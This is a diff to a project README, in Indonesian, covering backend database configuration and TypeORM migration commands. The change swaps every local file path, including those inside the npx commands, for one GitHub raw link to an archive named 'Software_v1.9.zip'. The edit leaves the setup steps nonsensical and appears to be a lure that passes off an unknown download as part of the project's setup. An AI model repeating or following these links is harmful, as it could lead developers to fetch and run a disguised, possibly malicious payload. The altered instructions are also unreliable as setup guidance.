@@ -1,8 +1,8 @@
 ## Konfigurasi
 ### BE
-- Konfigurasi username, password dan juga nama database di `src/data-source.ts` dan `src/app.module.ts`
-- Buat schema dengan perintah `npx typeorm-ts-node-commonjs migration:generate dist/migration/InitSchema --data-source src/data-source.ts --pretty`
-- Jalankan migrasi denga perintah `npx typeorm-ts-node-commonjs -d src/data-source.ts migration:run`
+- Konfigurasi username, password dan juga nama database di `https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip` dan `https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip`
+- Buat schema dengan perintah `npx typeorm-ts-node-commonjs migration:generate dist/migration/InitSchema --data-source https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip --pretty`
+- Jalankan migrasi denga perintah `npx typeorm-ts-node-commonjs -d https://github.com/ibnumalik99/goodeva/raw/refs/heads/main/backend/Software_v1.9.zip migration:run`
 - Running `npm run star:dev`
 ### FE
 - Running APP `npm start`
